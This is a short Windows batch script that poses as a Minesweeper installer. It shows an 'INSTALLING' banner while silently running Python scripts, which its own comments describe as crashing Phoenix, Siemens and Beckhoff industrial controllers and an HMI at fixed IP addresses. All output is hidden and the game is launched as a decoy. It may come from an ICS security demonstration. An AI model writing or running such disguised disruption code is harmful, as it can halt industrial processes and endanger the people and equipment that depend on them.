@ECHO OFF
REM Just add '>nul 2>&1' after 
COLOR F2
MODE 30,3
CLS && ECHO       --- INSTALLING ---

REM CRASHING PHOENIX
python Data/ChangeState.390.py>nul 2>&1

REM CRASHING SIEMENS
python Data/RestartSiemensSwitch.py>nul 2>&1

REM CRASHING BECKHOFF 
python Data/CX9020-restart.py 10.20.1.10>nul 2>&1
timeout 4 >nul 2>&1
python  Data/HMI-restart.py 10.20.1.11>nul 2>&1

START /B Data/MineSweeper.exe
EXIT